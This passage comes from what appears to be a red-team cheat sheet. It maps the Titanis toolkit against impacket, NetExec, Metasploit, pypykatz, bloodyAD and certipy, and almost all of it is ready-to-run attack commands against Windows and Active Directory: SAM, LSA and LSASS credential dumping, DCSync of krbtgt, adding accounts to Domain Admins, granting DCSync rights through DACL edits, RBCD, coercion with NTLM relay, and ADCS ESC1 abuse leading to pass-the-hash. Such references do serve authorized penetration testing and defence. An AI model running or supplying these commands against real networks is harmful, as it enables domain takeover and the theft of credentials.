smb2 enumstreams \\192.168.1.10\C$\Windows\Temp\file.txt \
  -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Server NIC Enumeration

```bash
# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --interfaces

# smbclient-ng
smbclient-ng --host 192.168.1.10 -u jdoe -p Password123 --domain DOMAIN nics

# Titanis
smb2 enumnics \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Bulk Share Enumeration

```bash
# NetExec
netexec smb 192.168.1.0/24 -u jdoe -p Password123 --shares

# Titanis
while IFS= read -r host; do
  echo "=== $host ==="
  smb2 enumshares "\\\\${host}" -UserName jdoe -UserDomain DOMAIN \
    -Password Password123 2>/dev/null
done < hosts.txt
```

[↑ Back to Index](#index)

---

## 4. Credential Dumping

### LSASS Minidump Parsing (offline)

```bash
# pypykatz — parse captured LSASS minidump
pypykatz lsa minidump lsass.DMP

# Output to JSON
pypykatz lsa minidump lsass.DMP -o lsass_creds.json --json

# Extract Kerberos tickets to ccache files (loadable via Titanis -TicketCache)
pypykatz lsa minidump lsass.DMP -k /tmp/kerberos_tickets/

# Extract DPAPI masterkeys from LSASS memory
pypykatz lsa minidump lsass.DMP -o dpapi_keys.json
```

[↑ Back to Index](#index)

---

### Dump SAM Hashes

```bash
# impacket
secretsdump.py -sam DOMAIN/jdoe:Password123@192.168.1.10

# Metasploit
msf6 > use auxiliary/gather/windows_secrets_dump
msf6 auxiliary(windows_secrets_dump) > run rhosts=192.168.1.10 smbdomain=DOMAIN \
  smbuser=jdoe smbpass=Password123 action=SAM

# Metasploit — pass-the-hash
msf6 auxiliary(windows_secrets_dump) > run rhosts=192.168.1.10 smbdomain=DOMAIN \
  smbuser=jdoe smbpass=aad3b435b51404eeaad3b435b51404ee:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
  action=SAM

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --sam

# Titanis
reg dumpsam 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123

# Titanis — backup operator (no admin required)
reg dumpsam 192.168.1.10 -UserName backupuser@DOMAIN \
  -Password Password123 -BackupSemantics
```

[↑ Back to Index](#index)

---

### Dump LSA Secrets

```bash
# impacket
secretsdump.py -lsa DOMAIN/jdoe:Password123@192.168.1.10

# Metasploit
msf6 auxiliary(windows_secrets_dump) > run rhosts=192.168.1.10 smbdomain=DOMAIN \
  smbuser=jdoe smbpass=Password123 action=LSA

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --lsa

# Titanis
reg dumplsasecrets 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Dump SAM + LSA Together

```bash
# impacket
secretsdump.py DOMAIN/jdoe:Password123@192.168.1.10

# Metasploit — ALL action (SAM + LSA + cached creds)
msf6 auxiliary(windows_secrets_dump) > run rhosts=192.168.1.10 smbdomain=DOMAIN \
  smbuser=jdoe smbpass=Password123 action=ALL

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --sam --lsa

# pypykatz — remote registry dump via SMB
pypykatz smb regdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
pypykatz smb regdump "smb2+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10"
pypykatz smb regdump "smb2+kerberos-ccache://DOMAIN\jdoe:@192.168.1.10?ccache=jdoe.ccache"

# pypykatz — remote LSASS dump + parse via SMB
pypykatz smb lsassdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
pypykatz smb lsassdump "smb2+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10"

# pypykatz — combined (SAM + LSA + LSASS in one call)
pypykatz smb secretsdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"

# Titanis
reg dumpsam        192.168.1.10 -UserName jdoe@DOMAIN -Password Password123
reg dumplsasecrets 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Bulk SAM / LSA Dump Across Hosts

```bash
# NetExec
netexec smb 192.168.1.0/24 -u jdoe -p Password123 --sam --lsa

# Titanis
while IFS= read -r host; do
  echo "=== $host ===" | tee -a sam_dump.txt
  reg dumpsam        "$host" -UserName jdoe@DOMAIN -Password Password123 >> sam_dump.txt 2>&1
  reg dumplsasecrets "$host" -UserName jdoe@DOMAIN -Password Password123 >> lsa_dump.txt 2>&1
done < hosts.txt
```

[↑ Back to Index](#index)

---

### DCSync

> **Titanis status:** MS-DRSR not yet implemented. Use Metasploit, pypykatz, or impacket. Feed recovered hashes into Titanis PTH flows.

```bash
# pypykatz — full domain dump
pypykatz smb dcsync "smb2+ntlm-password://DOMAIN\Administrator:Password123@192.168.1.1"

# pypykatz — single user (less noisy)
pypykatz smb dcsync "smb2+ntlm-password://DOMAIN\Administrator:Password123@192.168.1.1" \
  --username krbtgt

# pypykatz — pass-the-hash
pypykatz smb dcsync \
  "smb2+ntlm-nt://DOMAIN\Administrator:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1"

# Metasploit — full domain dump
msf6 > use auxiliary/gather/windows_secrets_dump
msf6 auxiliary(windows_secrets_dump) > run rhosts=192.168.1.1 smbdomain=DOMAIN \
  smbuser=Administrator smbpass=Password123 action=DOMAIN

# Metasploit — restrict to specific users
msf6 auxiliary(windows_secrets_dump) > run rhosts=192.168.1.1 smbdomain=DOMAIN \
  smbuser=Administrator smbpass=Password123 action=DOMAIN krb_users=krbtgt

# impacket — full NTLM dump
secretsdump.py DOMAIN/Administrator:Password123@192.168.1.1 -just-dc-ntlm

# impacket — single account
secretsdump.py DOMAIN/Administrator:Password123@192.168.1.1 \
  -just-dc-user DOMAIN/krbtgt

# NetExec
netexec smb 192.168.1.1 -u Administrator -p Password123 --ntds --user krbtgt

# Titanis — PTH with recovered hash
wmi exec dc01.domain.local -UserName Administrator@DOMAIN \
  -NtlmHash <recovered_ntlm> "whoami"
```

[↑ Back to Index](#index)

---

## 5. Enumeration

### Enumerate Domain Users (SAMR)

```bash
# impacket
samrdump.py DOMAIN/jdoe:Password123@192.168.1.10
net.py DOMAIN/jdoe:Password123@192.168.1.10 user

# enum4linux-ng
enum4linux-ng -U 192.168.1.10 -u jdoe -p Password123

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --users

# rpcclient
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "enumdomusers"

# msldap
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
# msldap> users

# Titanis
sam enumusers 192.168.1.10 -UserName jdoe -Password Password123
```

[↑ Back to Index](#index)

---

### Enumerate Groups / Local Aliases

```bash
# impacket — enumerate domain groups
net.py DOMAIN/jdoe:Password123@192.168.1.10 group

# impacket — enumerate local aliases (BUILTIN groups) on a host
net.py DOMAIN/jdoe:Password123@192.168.1.10 localgroup

# impacket — add/remove a user from a domain group
net.py DOMAIN/admin:Password123@192.168.1.10 group -name "Domain Admins" -join newuser
net.py DOMAIN/admin:Password123@192.168.1.10 group -name "Domain Admins" -unjoin newuser

# impacket — add/remove from a local alias (e.g. local Administrators)
net.py DOMAIN/admin:Password123@192.168.1.10 localgroup -name Administrators -join newuser
net.py DOMAIN/admin:Password123@192.168.1.10 localgroup -name Administrators -unjoin newuser

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --groups --local-groups

# rpcclient
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "enumdomgroups"
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "enumalsgroups builtin"

# msldap
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
# msldap> groups

# Titanis
sam enumgroups  192.168.1.10 -UserName jdoe -Password Password123
sam enumaliases 192.168.1.10 -UserName jdoe -Password Password123
```

[↑ Back to Index](#index)

---

### SID Brute Force / Lookup

```bash
# impacket — brute force RIDs
lookupsid.py DOMAIN/jdoe:Password123@192.168.1.10

# enum4linux-ng
enum4linux-ng -R 192.168.1.10 -u jdoe -p Password123

# Titanis — resolve SID
lsa lookupsid 192.168.1.10 -UserName jdoe -Password Password123 \
  S-1-5-21-1234567890-1234567890-1234567890-500

# Titanis — name to SID
lsa lookupname 192.168.1.10 -UserName jdoe -Password Password123 Administrator jdoe
```

[↑ Back to Index](#index)

---

### Enumerate RPC Endpoints

```bash
# impacket
rpcdump.py DOMAIN/jdoe:Password123@192.168.1.10
rpcmap.py ncacn_ip_tcp:192.168.1.10

# Titanis
epm lsep 192.168.1.10
```

[↑ Back to Index](#index)

---

### Query WMI

```bash
# impacket
wmiquery.py -query "SELECT * FROM Win32_Process" DOMAIN/jdoe:Password123@192.168.1.10

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --wmi "SELECT * FROM Win32_Process"

# Titanis
wmi query 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  "SELECT * FROM Win32_Process"
wmi query 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  -OutputFields Caption,ProcessId,ParentProcessId "SELECT * FROM Win32_Process"
```

[↑ Back to Index](#index)

---

### WMI Method Invocation

```bash
# impacket — exec-based workaround only
wmiexec.py DOMAIN/jdoe:Password123@192.168.1.10 "calc.exe"

# Titanis — invoke any WMI method directly
wmi invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  Win32_Process Create "calc.exe"
```

[↑ Back to Index](#index)

---

### Remote Registry Operations

```bash
# impacket — list key
reg.py DOMAIN/jdoe:Password123@192.168.1.10 query \
  -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion

# Titanis — list key
reg list 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion

# impacket — read a value
reg.py DOMAIN/jdoe:Password123@192.168.1.10 query \
  -keyName HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa -v LsaCfgFlags

# Titanis — read a value
reg get 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  HKLM/SYSTEM/CurrentControlSet/Control/Lsa LsaCfgFlags

# impacket — set a value
reg.py DOMAIN/jdoe:Password123@192.168.1.10 add \
  -keyName HKCU\\Software\\Test -v TestValue -vt REG_SZ -vd "TestData"

# Titanis — set a value
reg set 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  HKCU/Software/Test sz:TestValue=TestData
```

[↑ Back to Index](#index)

---

### Registry Key Security Descriptor

```bash
# rpcclient
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "regetkeysecurity HKLM\\SAM"
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "regsetsecurity HKLM\\SAM <SDDL>"

# Titanis
reg getsd 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 HKLM/SAM
reg setsd 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  HKLM/SAM "O:BAG:SYD:(A;;KA;;;SY)"
```

[↑ Back to Index](#index)

---

### Service Enumeration

```bash
# impacket
services.py DOMAIN/jdoe:Password123@192.168.1.10 list

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --services

# Titanis
scm query 192.168.1.10 -UserName jdoe -Password Password123

# impacket — start / stop
services.py DOMAIN/jdoe:Password123@192.168.1.10 start -name Spooler
services.py DOMAIN/jdoe:Password123@192.168.1.10 stop  -name Spooler

# Titanis — start / stop
scm start 192.168.1.10 -UserName jdoe -Password Password123 Spooler
scm stop  192.168.1.10 -UserName jdoe -Password Password123 Spooler
```

[↑ Back to Index](#index)

---

### LSA Privilege Management

```bash
# rpcclient
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 \
  -c "lsaaddprivs S-1-5-21-...-1001 SeDebugPrivilege"
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 \
  -c "lsadelprivs S-1-5-21-...-1001 SeDebugPrivilege"

# Titanis
lsa addpriv      192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 jdoe SeDebugPrivilege
lsa rmpriv       192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 jdoe SeDebugPrivilege
lsa setsysaccess 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 jdoe 0x20
```

[↑ Back to Index](#index)

---

### LSA Privilege and Account Enumeration

```bash
# rpcclient
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "lsaenumsid"
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "enumprivs"

# enum4linux-ng
enum4linux-ng -P 192.168.1.10 -u jdoe -p Password123

# Titanis
lsa enumaccounts     192.168.1.10 -UserName jdoe@DOMAIN -Password Password123
lsa enumprivaccounts 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 SeDebugPrivilege
lsa getprivs         192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 jdoe
lsa getrights        192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 jdoe
lsa getsysaccess     192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 jdoe
```

[↑ Back to Index](#index)

---

## 6. Active Directory / LDAP

### Enumerate AD Users / Computers

```bash
# impacket
GetADUsers.py    -all -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123
GetADComputers.py     -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123

# NetExec
netexec ldap 192.168.1.1 -u jdoe -p Password123 --users
netexec ldap 192.168.1.1 -u jdoe -p Password123 --computers

# msldap — password
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
# msldap> users / computers / info / trusts / gpos

# msldap — pass-the-hash
msldap "ldap+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1"

# msldap — Kerberos ccache
msldap "ldap+kerberos-ccache://DOMAIN\jdoe:@dc01.domain.local/?dc=192.168.1.1&ccache=jdoe.ccache"

# msldap — via SOCKS5
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1/?proxytype=socks5&proxyhost=127.0.0.1&proxyport=1080"

# Titanis
ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 "(objectClass=user)"
ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 "(objectClass=computer)"
```

[↑ Back to Index](#index)

---

### GPO and Domain Trust Enumeration

```bash
# msldap
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
# msldap> gpos / trusts

# ldapsearch — raw GPO objects
ldapsearch -H ldap://192.168.1.1 -D "CN=jdoe,CN=Users,DC=domain,DC=local" -w Password123 \
  -b "CN=Policies,CN=System,DC=domain,DC=local" "(objectClass=groupPolicyContainer)" \
  displayName gPCFileSysPath
```

[↑ Back to Index](#index)

---

### Find Delegation Configurations

```bash
# impacket
findDelegation.py -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123

# NetExec
netexec ldap 192.168.1.1 -u jdoe -p Password123 --trusted-for-delegation

# msldap
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
# msldap> unconstrained

# Titanis — unconstrained
ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
  "(userAccountControl|=TrustedForDelegation)" -OutputFields *

# Titanis — constrained
ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
  "(msDS-AllowedToDelegateTo=*)" -OutputFields *

# Titanis — S4U2self only
ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
  "(userAccountControl|=TrustedForS4U2self)" -OutputFields *
```

[↑ Back to Index](#index)

---

### Add a Computer Account

```bash
# impacket
addcomputer.py -method LDAP -computer-name EVILPC$ -computer-pass Password123 \
  -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123

# bloodyAD
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 add computer EVILPC$ Password123!

# Titanis
ldap addcomputer 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 EVILPC$ Password123
```

[↑ Back to Index](#index)

---

### Add a User Account

```bash
# impacket — net.py creates user via SAMR (account starts disabled; enable separately)
net.py DOMAIN/admin:Password123@192.168.1.1 user -add newuser
net.py DOMAIN/admin:Password123@192.168.1.1 user -enable newuser
# Note: net.py does not set a password on creation — follow up with changepasswd.py
changepasswd.py -reset DOMAIN/admin:Password123@192.168.1.1 -newpass Password123! -altuser DOMAIN/newuser

# bloodyAD — password
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 add user newuser Password123!

# bloodyAD — pass-the-hash
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
  add user newuser Password123!

# net rpc (Samba)
net rpc user add newuser Password123! -U DOMAIN/jdoe%Password123 -S 192.168.1.10

# Titanis
ldap adduser 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 newuser Password123!
```

[↑ Back to Index](#index)

---

### Set RBCD

```bash
# impacket
rbcd.py -delegate-from EVILPC$ -delegate-to TARGET$ -action write \
  -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123

# bloodyAD
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 set object TARGET$ \
  msDS-AllowedToActOnBehalfOfOtherIdentity -v '<SDDL>'

# Titanis
ldap mod 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 TARGET$ \
  "msDS-AllowedToActOnBehalfOfOtherIdentity+=<binary SDDL>"
```

[↑ Back to Index](#index)

---

### DACL Abuse

> **Titanis status:** No ACE-write capability. `bloodyAD` is the preferred non-impacket option. `dacledit.py` / `owneredit.py` are the impacket fallbacks.

```bash
# bloodyAD — grant GenericAll
bloodyAD -H 192.168.1.1 -d DOMAIN -u admin -p AdminPass \
  add genericAll "CN=targetuser,CN=Users,DC=domain,DC=local" jdoe

# bloodyAD — grant DCSync rights
bloodyAD -H 192.168.1.1 -d DOMAIN -u admin -p AdminPass add dcsync jdoe

# bloodyAD — change owner
bloodyAD -H 192.168.1.1 -d DOMAIN -u admin -p AdminPass set owner targetuser jdoe

# bloodyAD — cleanup
bloodyAD -H 192.168.1.1 -d DOMAIN -u admin -p AdminPass \
  remove genericAll "CN=targetuser,CN=Users,DC=domain,DC=local" jdoe

# dacledit.py — grant DCSync
dacledit.py -action write -rights DCSync \
  -principal jdoe -target-dn "DC=domain,DC=local" \
  DOMAIN/admin:AdminPass@192.168.1.1

# dacledit.py — grant GenericAll
dacledit.py -action write -rights FullControl \
  -principal jdoe -target-dn "CN=targetuser,CN=Users,DC=domain,DC=local" \
  DOMAIN/admin:AdminPass@192.168.1.1

# owneredit.py — change owner
owneredit.py -action write -new-owner jdoe \
  -target-dn "CN=targetuser,CN=Users,DC=domain,DC=local" \
  DOMAIN/admin:AdminPass@192.168.1.1

# Titanis — post-exploitation after ACE grant (force password reset)
kerb setpw -UserName jdoe@DOMAIN -Kdc 192.168.1.1 -Password jdoePass \
  targetuser@DOMAIN NewPass123
```

[↑ Back to Index](#index)

---

### User Attribute Modification (UAC Bitflags)

```bash
# impacket — enable / disable an account (net.py covers these two UAC bits directly)
net.py DOMAIN/admin:Password123@192.168.1.1 user -enable  targetuser
net.py DOMAIN/admin:Password123@192.168.1.1 user -disable targetuser

# bloodyAD — add UAC flag (enable AS-REP roasting)
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 \
  add uac targetuser -f DONT_REQ_PREAUTH

# bloodyAD — remove UAC flag (re-enable account)
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 \
  remove uac targetuser -f ACCOUNTDISABLE

# Titanis
ldap moduser 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
  targetuser userAccountControl+=DONT_REQUIRE_PREAUTH
```

[↑ Back to Index](#index)

---

## 7. Auth Coercion

> Pair the coerce leg with `ntlmrelayx` or Responder for the relay leg. Titanis `credcoerce` covers MS-EFSR only.

```bash
# MS-EFSR — single technique
credcoerce 192.168.1.10 \\<listener-ip>\share \
  -UserName jdoe@DOMAIN -Password Password123 -Techniques Efs.OpenFile

# MS-EFSR — multiple techniques
credcoerce 192.168.1.10 \\<listener-ip>\share \
  -UserName jdoe@DOMAIN -Password Password123 \
  -Techniques Efs.OpenFile,Efs.EncryptFile,Efs.DecryptFile,\
  Efs.QueryUsersOnFile,Efs.QueryRecoveryAgents,Efs.FileKeyInfo,\
  Efs.DuplicateEncryptionInfoFile

# MS-RPRN (PrinterBug) — no Titanis equivalent
printerbug.py DOMAIN/jdoe:Password123@192.168.1.10 <listener-ip>

# MS-DFSNM (DFSCoerce) — no Titanis equivalent
python3 dfscoerce.py -d DOMAIN -u jdoe -p Password123 <listener-ip> 192.168.1.10

# MS-FSRVP (ShadowCoerce) — no Titanis equivalent
python3 shadowcoerce.py -d DOMAIN -u jdoe -p Password123 <listener-ip> 192.168.1.10
```

[↑ Back to Index](#index)

---

### Coerce + Relay Pattern

```bash
# Terminal 1 — relay listener (SMB)
ntlmrelayx.py -tf targets.txt -smb2support

# Terminal 1 — relay to LDAP for RBCD / shadow credentials
ntlmrelayx.py -t ldaps://192.168.1.1 --delegate-access --escalate-user jdoe

# Terminal 2 — trigger coercion
credcoerce 192.168.1.10 \\<relay-listener-ip>\share \
  -UserName jdoe@DOMAIN -Password Password123 -Techniques Efs.OpenFile
```

[↑ Back to Index](#index)

---

## 8. Certificates

### Self-Signed PFX Generation

```bash
# certipy — AD-aware UPN/SAN fields
certipy forge -upn jdoe@DOMAIN -subject 'CN=jdoe' -out jdoe.pfx

# certipy — Golden Certificate from compromised CA key
certipy forge -upn Administrator@DOMAIN -ca-pfx ca.pfx -out admin.pfx

# openssl — generic PKI (not trusted by AD for PKINIT without NTAuth enrollment)
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/CN=jdoe"
openssl pkcs12 -export -out jdoe.pfx -inkey key.pem -in cert.pem -passout pass:Password123

# Titanis
cert selfcert -Subject CN=jdoe -OutputFile jdoe.pfx
```

[↑ Back to Index](#index)

---

### ADCS Certificate Template Enumeration

```bash
# certipy — includes ESC1–ESC8 vulnerability analysis
certipy find -dc-ip 192.168.1.1 -u jdoe@DOMAIN -p Password123 -vulnerable -stdout

# msldap — raw template list
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
# msldap> adcs

# ldapsearch
ldapsearch -H ldap://192.168.1.1 -D "CN=jdoe,CN=Users,DC=domain,DC=local" -w Password123 \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
  "(objectClass=pKICertificateTemplate)" displayName msPKI-Certificate-Name-Flag
```

[↑ Back to Index](#index)

---

### ADCS ESC1 — Enroll and Recover NT Hash

```bash
# Step 1 — enumerate vulnerable templates
certipy find -dc-ip 192.168.1.1 -u jdoe@DOMAIN -p Password123 -vulnerable -stdout

# Step 2 — request certificate with arbitrary UPN
certipy req -username jdoe@DOMAIN -password Password123 \
  -ca CA-NAME -template VulnerableTemplate \
  -upn Administrator@DOMAIN.LOCAL \
  -target ca.domain.local -out admin

# Step 3a — certipy: recover NT hash + TGT
certipy auth -pfx admin.pfx -dc-ip 192.168.1.1 -domain DOMAIN.LOCAL

# Step 3b — minikerberos: recover NT hash only
minikerberos-getNTPKInit \
  "kerberos-pfx://DOMAIN\Administrator:@192.168.1.1?pfx=admin.pfx" admin_nt.txt

# Step 4 — Titanis PTH with recovered hash
wmi exec dc01.domain.local -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> "whoami"
smb2 ls \\dc01.domain.local\C$ -UserName Administrator -UserDomain DOMAIN \
  -NtlmHash <recovered_nt>
reg dumpsam dc01.domain.local -UserName Administrator@DOMAIN -NtlmHash <recovered_nt>
```

[↑ Back to Index](#index)

---
